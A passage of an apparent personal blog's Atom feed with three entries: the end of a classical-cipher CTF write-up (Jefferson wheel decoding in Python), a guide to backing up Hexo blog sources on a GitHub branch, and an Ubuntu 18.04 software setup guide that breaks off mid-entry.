class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:  &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line"><span class="number">2</span>:  &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line"><span class="number">3</span>:  &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line"><span class="number">4</span>:  &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line"><span class="number">5</span>:  &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line"><span class="number">6</span>:  &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line"><span class="number">7</span>:  &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line"><span class="number">8</span>:  &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line"><span class="number">9</span>:  &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span><br><span class="line"><span class="number">10</span>: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span><br><span class="line"><span class="number">11</span>： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span><br><span class="line"><span class="number">12</span>： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span><br><span class="line"><span class="number">13</span>： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span><br><span class="line"></span><br><span class="line">密钥为：<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">6</span></span><br><span class="line">密文为：NFQKSEVOQOFNP</span><br></pre></td></tr></table></figure><p>大概就像旧式电话一样</p><p>对应着电话号码(2,3,7,5,13,12,9,1,8,10,4,11,6)</p><p>把对应轮数中的对应字符(N F Q K S E V O Q O F N P)</p><p>拨到第一个去(看下图第一列,与密文相同)</p><p><img src="image-20200404230355691.png" alt="image-20200404230355691"></p><p>然后竖着看,直到找到有实际意义的字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circle</span><span class="params">(string,char)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> string[<span class="number">0</span>]!=char:</span><br><span class="line">        string=string[<span class="number">1</span>:]+string[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line">s=<span class="string">"""ZWAXJGDLUBVIQHKYPNTCRMOSFE </span></span><br><span class="line"><span class="string">KPBELNACZDTRXMJQOYHGVSFUWI </span></span><br><span class="line"><span class="string">BDMAIZVRNSJUWFHTEQGYXPLOCK </span></span><br><span class="line"><span class="string">RPLNDVHGFCUKTEBSXQYIZMJWAO </span></span><br><span class="line"><span class="string">IHFRLABEUOTSGJVDKCPMNZQWXY </span></span><br><span class="line"><span class="string">AMKGHIWPNYCJBFZDRUSLOQXVET </span></span><br><span class="line"><span class="string">GWTHSPYBXIZULVKMRAFDCEONJQ </span></span><br><span class="line"><span class="string">NOZUTWDCVRJLXKISEFAPMYGHBQ </span></span><br><span class="line"><span class="string">XPLTDSRFHENYVUBMCQWAOIKZGJ </span></span><br><span class="line"><span class="string">UDNAJFBOWTGVRSCZQKELMXYIHP </span></span><br><span class="line"><span class="string">MNBVCXZQWERTPOIUYALSKDJFHG </span></span><br><span class="line"><span class="string">LVNCMXZPQOWEIURYTASBKJDFHG </span></span><br><span class="line"><span class="string">JZQAWSXCDERFVBGTYHNUMKILOP"""</span></span><br><span class="line">s=s.replace(<span class="string">" \n"</span>,<span class="string">" "</span>)</span><br><span class="line">lst=s.split(<span class="string">' '</span>)</span><br><span class="line"></span><br><span class="line">key=<span class="string">"2,3,7,5,13,12,9,1,8,10,4,11,6"</span></span><br><span class="line">key=key.split(<span class="string">","</span>)</span><br><span class="line">key=[int(i)<span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> key]</span><br><span class="line"></span><br><span class="line">x=<span class="string">"NFQKSEVOQOFNP"</span></span><br><span class="line">end=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">    tempstr=lst[key[i]]</span><br><span class="line">    word=x[i]</span><br><span class="line">    end.append(circle(tempstr,word))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">13</span>):</span><br><span class="line">        print(end[j][i].lower(),end=<span class="string">""</span>)</span><br><span class="line">    print(<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure><p>输出如下</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">nfqksevoqofnp</span><br><span class="line">ahgcxiusnwcbn</span><br><span class="line">ctwpcubfotuvy</span><br><span class="line">zetmdrmezgkcc</span><br><span class="line">dqhneyczuvtxj</span><br><span class="line">tgszrtqwtrezb</span><br><span class="line">rypqfawawsbqf</span><br><span class="line">xxywvsaxdcswz</span><br><span class="line">mpbxbbojczxed</span><br><span class="line"><span class="keyword">jlxygkigvqqrr</span></span><br><span class="line"><span class="keyword">qoiitjkdrkytu</span></span><br><span class="line"><span class="keyword">oczhydzljeips</span></span><br><span class="line"><span class="keyword">ykufhfgullzol</span></span><br><span class="line"><span class="keyword">hblrnhjbxmmio</span></span><br><span class="line"><span class="keyword">gdvlugxvkxjuq</span></span><br><span class="line"><span class="keyword">vmkamlpiiywyx</span></span><br><span class="line"><span class="keyword">sambkvlqsiaav</span></span><br><span class="line"><span class="keyword">fireinthehole</span></span><br><span class="line"><span class="keyword">uzaulcdkfprst</span></span><br><span class="line"><span class="keyword">wvfoomsyaupka</span></span><br><span class="line"><span class="keyword">irdtpxrppdldm</span></span><br><span class="line"><span class="keyword">kncsjzfnmnnjk</span></span><br><span class="line"><span class="keyword">psegzphtyadfg</span></span><br><span class="line"><span class="keyword">bjojqqecgjvhh</span></span><br><span class="line"><span class="keyword">eunvaonrhfhgi</span></span><br><span class="line"><span class="keyword">lwjdwwymbbgmw</span></span><br></pre></td></tr></table></figure><p>发现就<strong>fireinthehole</strong>是个可读的字符串</p><h2 id="9-easy-ECC"><a href="#9-easy-ECC" class="headerlink" title="9. easy_ECC"></a>9. easy_ECC</h2><p>是的,我不会</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;攻防世界-crypto-新手练习区&quot;&gt;&lt;a href=&quot;#攻防世界-crypto-新手练习区&quot; class=&quot;headerlink&quot; title=&quot;攻防世界-crypto-新手练习区&quot;&gt;&lt;/a&gt;攻防世界-crypto-新手练习区&lt;/h1&gt;&lt;h2 id=&quot;1-bas
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://mercer5.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://mercer5.github.io/tags/ctf/"/>
    
      <category term="密码" scheme="https://mercer5.github.io/tags/%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>blog备份</title>
    <link href="https://mercer5.github.io/2020/04/04/blog%E5%A4%87%E4%BB%BD/"/>
    <id>https://mercer5.github.io/2020/04/04/blog%E5%A4%87%E4%BB%BD/</id>
    <published>2020-04-04T07:59:06.000Z</published>
    <updated>2020-08-24T15:30:09.732Z</updated>
    
    <content type="html"><![CDATA[<h1 id="备份blog"><a href="#备份blog" class="headerlink" title="备份blog"></a>备份blog</h1><hr><p>由于<code>hexo d</code>上传部署到github的其实是hexo编译后的文件，是用来生成网页的，不包含源文件。</p><p>也就是上传的是在本地目录里自动生成的<code>.deploy_git</code>里面。</p><p>其他文件 ，包括我们写在source 里面的，和配置文件，主题文件，都没有上传到github</p><p>由于最近电脑经常出问题,感觉还是乘早把东西都备份一下的好</p><hr><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><ol><li><p>在github中,作为blog的仓库新建一个分支</p><p>我建了一个hexo</p><p><img src="Snipaste_2020-04-04_15-36-20.png" alt="Snipaste_2020-04-04_15-36-20"></p></li><li><p>把新建的分支设为默认分支</p><p>这样的话,clone下来的,还有push上去的都只会在hexo分支中进行</p><p>而最开始的master分支,就会只用来存储静态网页</p><p><code>setting</code>–&gt;<code>branckes</code>–&gt;<code>hexo</code>–&gt;<code>update</code></p><p><img src="Snipaste_2020-04-04_15-40-38.png" alt="Snipaste_2020-04-04_15-40-38"></p></li></ol><h2 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h2><ol><li><p>在你喜欢的地方新建一个文件夹</p></li><li><p>打开git bash ,clone一下文件</p><p><img src="Snipaste_2020-04-04_15-44-21.png" alt="Snipaste_2020-04-04_15-44-21"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">&lt;url</span>&gt;</span><br></pre></td></tr></table></figure></li><li><p>把clone到本地的文件删到只剩下<strong>.git</strong>文件夹</p><p><img src="Snipaste_2020-04-04_15-46-08.png" alt="Snipaste_2020-04-04_15-46-08"></p></li><li><p>把之前我们写的博客源文件全部复制过来，除了<code>.deploy_git</code>。这里应该说一句，复制过来的源文件应该有一个<code>.gitignore</code>，用来忽略一些不需要的文件，如果没有的话，自己新建一个，在里面写上如下，表示这些类型文件不需要git：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.DS_Store</span></span><br><span class="line">Thumbs<span class="number">.</span><span class="built_in">db</span></span><br><span class="line"><span class="built_in">db</span><span class="number">.</span>json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line"><span class="meta">public</span>/</span><br><span class="line"><span class="meta">.deploy</span>*/</span><br></pre></td></tr></table></figure></li><li><p>看看theme/next 下面有没有<strong>.git</strong>文件夹,如果有,把删掉</p><p>因为git不能嵌套上传</p></li><li><p>文件夹中大概像图片那样就行了(aaaa,那个<code>.deploy_git</code>是之后生成的,忽略掉就好)</p><p><img src="Snipaste_2020-04-04_15-48-19.png" alt="Snipaste_2020-04-04_15-48-19"></p></li></ol><h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">add</span> .</span><br><span class="line">git commit –m <span class="string">"backup"</span></span><br><span class="line">git <span class="keyword">push</span></span><br></pre></td></tr></table></figure><p>然后去github康康,hexo分支应该就变成你文件夹中应该有的东西了</p><p><img src="Snipaste_2020-04-04_15-57-48.png" alt="Snipaste_2020-04-04_15-57-48"></p><p>而master分支没有变化</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>确保<code>hexo deploy</code>推送的是master分支，hexo目录下的_config.yml文件通常会配置deploy推送的目标地址，这个一般在最初使用hexo时，就会配置为master，不用改动：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">https://github.com/sherlockyb/sherlockyb.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>之后就可以在文件夹中快乐的使用了</p><h3 id="生成网页"><a href="#生成网页" class="headerlink" title="生成网页"></a>生成网页</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">hexo</span> <span class="string">clean</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">g</span></span><br><span class="line"><span class="attr">hexo</span> <span class="string">d</span></span><br></pre></td></tr></table></figure><h3 id="备份源码"><a href="#备份源码" class="headerlink" title="备份源码"></a>备份源码</h3><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">add</span> .</span><br><span class="line">git commit -m <span class="string">"description"</span></span><br><span class="line">git <span class="keyword">push</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;备份blog&quot;&gt;&lt;a href=&quot;#备份blog&quot; class=&quot;headerlink&quot; title=&quot;备份blog&quot;&gt;&lt;/a&gt;备份blog&lt;/h1&gt;&lt;hr&gt;
&lt;p&gt;由于&lt;code&gt;hexo d&lt;/code&gt;上传部署到github的其实是hexo编译后的文件，是用
      
    
    </summary>
    
    
      <category term="blog" scheme="https://mercer5.github.io/categories/blog/"/>
    
    
      <category term="blog" scheme="https://mercer5.github.io/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>从零开始ubuntu</title>
    <link href="https://mercer5.github.io/2020/04/04/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bubuntu/"/>
    <id>https://mercer5.github.io/2020/04/04/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bubuntu/</id>
    <published>2020-04-04T07:21:02.000Z</published>
    <updated>2020-08-24T15:30:09.810Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从零开始ubuntu-18-04"><a href="#从零开始ubuntu-18-04" class="headerlink" title="从零开始ubuntu 18.04"></a>从零开始ubuntu 18.04</h1><hr><ol><li><p>投入kali怀抱好久了,突然想搞ubuntu</p><p>一个搞人,一个搞编程,分工明确,嗯</p><p>想想搞kali时的艰难经过,想必这次也不会例外</p><p>所以记录一下使用ubuntu的曲折历程</p></li><li><p>要是我的提供不了帮助,建议拉到最下面,点击链接看原博客</p><p>每个人情况不一样,我只记录并解决了我所遇到的问题</p><p>看着参考越来越多,相当于一个小型资料库了都: (</p></li><li><p>记录一下时间,要是时间过去很久了,参考价值就小了</p><p>2020-04-03(最近更新时间)</p></li></ol><hr><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.<span class="built_in">list</span></span><br></pre></td></tr></table></figure><p>附上清华源</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 默认注释了源码镜像以提高 apt <span class="keyword">update</span> 速度，如有需要可自行取消注释</span><br><span class="line"><span class="keyword">deb</span> http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"># <span class="keyword">deb</span>-src http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span> http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line"># <span class="keyword">deb</span>-src http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span> http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"># <span class="keyword">deb</span>-src http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span> http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line"># <span class="keyword">deb</span>-src http<span class="variable">s:</span>//mirrors.tuna.tsinghua.edu.<span class="keyword">cn</span>/ubuntu/ bionic-security main restricted universe multiverse</span><br></pre></td></tr></table></figure><h2 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h2><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> vim</span><br></pre></td></tr></table></figure><p>一些简单的操作</p><ol><li><p>vim name.txt(打开或创建编辑器)</p></li><li><p>“i”插入模式(只有进入插入模式才可以更改内容)    (^u,好用的删行小技巧)</p></li><li><p>“esc”退出插入模式</p></li><li><p>“:”,wq(写入并保存)</p><p>(A：在最后输入命令时，直接输入”x”，也是一样的，即X=WQ。</p><p>B：最快捷的方法：按了ESC后，直接按shift+zz，或者切换到大写模式按ZZ，就可以保存退出了，即是按2下大写的Z)</p></li></ol><h2 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h2><p>安装</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install python-pip</span><br><span class="line">sudo apt-<span class="builtin-name">get</span> install python3-pip</span><br></pre></td></tr></table></figure><p>升级</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 <span class="keyword">install</span> <span class="comment">--upgrade pip</span></span><br></pre></td></tr></table></figure><p>卸载</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> <span class="builtin-name">remove</span> python3-pip</span><br></pre></td></tr></table></figure><h2 id="vm-tools"><a href="#vm-tools" class="headerlink" title="vm-tools"></a>vm-tools</h2><p>电脑里的文件拖不进虚拟机,复制的也粘贴不了</p><p>输入命令行全手打,我天</p><p>不过这个不是ubuntu的锅,是vm的</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span> autoremove <span class="keyword">open</span>-<span class="keyword">vm</span>-tools</span><br><span class="line">sudo apt-<span class="built_in">get</span> install <span class="keyword">open</span>-<span class="keyword">vm</span>-tools</span><br><span class="line">sudo apt-<span class="built_in">get</span> install <span class="keyword">open</span>-<span class="keyword">vm</span>-tools-desktop</span><br></pre></td></tr></table></figure><h2 id="gcc"><a href="#gcc" class="headerlink" title="gcc"></a>gcc</h2><p>安装</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="builtin-name">get</span> install gcc</span><br></pre></td></tr></table></figure><p>验证</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc <span class="comment">--version</span></span><br></pre></td></tr></table></figure><p>使用</p><p>​    强烈推荐: <a href="http://c.biancheng.net/view/660.html" target="_blank" rel="noopener">http://c.biancheng.net/view/660.html</a></p><p>​    照着做就会了(为什么有种推销员的感觉???)</p><h2 id="好玩的终端命令"><a href="#好玩的终端命令" class="headerlink" title="好玩的终端命令"></a>好玩的终端命令</h2><p><strong>小火车</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install sl</span><br><span class="line">sl</span><br></pre></td></tr></table></figure><p><strong>cmatrix代码雨</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install cmatrix</span><br><span class="line">cmatrix</span><br></pre></td></tr></table></figure><p><strong>终端火焰</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libaa-bin</span><br><span class="line">aafire</span><br></pre></td></tr></table></figure><h2 id="输入法"><a href="#输入法" class="headerlink" title="输入法"></a>输入法</h2><p><strong>安装Fcitx输入框架</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> fcitx</span><br></pre></td></tr></table></figure><p><strong>安装</strong></p><p>上搜狗输入法官网下载Linux版本搜狗输入法（32位和64位根据自己情况，在虚拟机上用浏览器下载</p><p>点击安装包</p><p><strong>设置</strong></p><p><img src="Snipaste_2020-04-02_09-31-10.png" alt="Snipaste_2020-04-02_09-31-10"></p><p>根据红色箭头进入语言安装界面，安装语言（会自动安装中文语言）</p><p><img src="Snipaste_2020-04-02_09-31-18.png" alt="Snipaste_2020-04-02_09-31-18"></p><p>根据下方箭头更爱输入框架为fcitx，然后点击上面的Apply System-Wide应用到全局。然后将当前用户进行注销后再进行登录（注销没有效果，重启就可以了）。</p><p>登陆后在右上角出现一个键盘标志，点击进入，选择Configure Current Input Method</p><p><img src="Snipaste_2020-04-02_09-31-25.png" alt="Snipaste_2020-04-02_09-31-25"></p><p>进入下面的Input Method界面后，选择+号</p><p><img src="Snipaste_2020-04-02_09-31-31.png" alt="Snipaste_2020-04-02_09-31-31"></p><p>进入到Add input method界面，将下面的Only Show Current Language 点掉后，在搜索栏搜索搜狗拼音，选中之后进行添加。</p><p><img src="Snipaste_2020-04-02_09-31-37.png" alt="Snipaste_2020-04-02_09-31-37"></p><p>添加成功后，将搜狗拼音移到第一位。</p><p>成功之后，打开浏览器随便输入，可以看到输入结果，同时成功后下方还会出现搜狗输入法的标志，这时候就可以通过shirt键切换中英文。</p><p><strong>其他</strong></p><p>不习惯默认中文的小伙伴可以,把sogou放在第二个</p><h2 id="vscode"><a href="#vscode" class="headerlink" title="vscode"></a>vscode</h2><p><strong>安装</strong></p><ol><li><p>首先，更新包的索引和安装的依赖键入:</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">sudo</span> apt update</span><br><span class="line"><span class="title">sudo</span> apt install software-properties-common apt-trans<span class="keyword">port</span>-https wget</span><br></pre></td></tr></table></figure></li><li><p>接下来，使用以下[wget命令]导入Microsoft GPG密钥</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q http<span class="variable">s:</span>//packages.microsoft.<span class="keyword">com</span>/<span class="built_in">keys</span>/microsoft.asc -O- | sudo apt-key <span class="built_in">add</span> -</span><br></pre></td></tr></table></figure><p>并使Visual Studio Coderepository通过键入:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository <span class="string">"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main"</span></span><br></pre></td></tr></table></figure></li><li><p>安装最新版本的Visual Studio代码:</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">sudo</span> <span class="string">apt update</span></span><br><span class="line"><span class="attr">sudo</span> <span class="string">apt install code</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>使用</strong></p><p>终端输入<code>code</code>,或者单击vscode图标</p><p><strong>插件推荐</strong></p><ol><li>Chinese (Simplified) Language Pack for Visual Studio Code 就问你中文香不香</li><li>C/C++ </li><li>Python</li><li>Code Runner 可以跑好多种代码,好评</li></ol><p><strong>配置c</strong></p><ol><li><p>安装vscode插件———-&gt;c/c++</p></li><li><p>创建一个c文件,输入一些代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include&lt;stdio.h&gt;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"hello world"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>终端输入<code>sudo apt install gcc</code></p></li><li><p>在菜单栏里面选择Terminal–&gt;Configure Tasks–&gt;gcc，会自动帮你生成<code>.vscode</code>目录和一个<code>launch.json</code>文件</p></li><li><p>打开c文件按F5,会报错,顺着点就会自动生成第二个文件<code>tasks.json</code></p></li><li><p>再次按F5就成功编译了</p></li></ol><ul><li>我看网上很多对于配置文件有所改动,但是就算博主可以用,也是针对他自己的电脑可以用</li><li>直接复制粘贴,对路径啊什么的略作修改啊,成功率挺低的</li><li>所以我想看看直接默认配置会怎么样,毕竟软件做出来是给人用的,搞这么麻烦,不人道啊</li><li>……可以用了: )</li><li>比起win10,ubuntu意外的好用呢&gt;&lt;</li></ul><p><strong>配置py</strong></p><ol><li>安装python插件</li><li>新建test.py文件,会弹出</li></ol><p><img src="Snipaste_2020-04-01_09-32-47.png" alt="Snipaste_2020-04-01_09-32-47"></p><ol start="3"><li><p>直接点击安装，由于缺少pip环境会导致安装失败。</p></li><li><p>于是先安装pip：sudo apt-get install python-pip</p></li><li><p>然后直接安装即可：pip install pylint</p></li></ol><h2 id="sublime-text3"><a href="#sublime-text3" class="headerlink" title="sublime text3"></a>sublime text3</h2><ol><li><p>运行命令添加密钥环：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO - http<span class="variable">s:</span>//download.sublimetext.<span class="keyword">com</span>/sublimehq-pub.gpg | sudo apt-key <span class="built_in">add</span> -</span><br></pre></td></tr></table></figure></li><li><p>添加apt存储库:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"deb https://download.sublimetext.com/ apt/stable/"</span> | sudo tee /etc/apt/sources.<span class="built_in">list</span>.d/sublime-<span class="built_in">text</span>.<span class="built_in">list</span></span><br></pre></td></tr></table></figure></li><li><p>通过Synaptic包管理器或运行命令安装sublime-text包：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">update</span> &amp;&amp; sudo apt <span class="keyword">install</span> sublime-<span class="built_in">text</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="java-jdk-8"><a href="#java-jdk-8" class="headerlink" title="java jdk-8"></a>java jdk-8</h2><p>更新软件包列表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>2、安装openjdk-8-jdk：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure><p>3、查看java版本，看看是否安装成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -version</span><br></pre></td></tr></table></figure><h2 id="调整终端字体大小"><a href="#调整终端字体大小" class="headerlink" 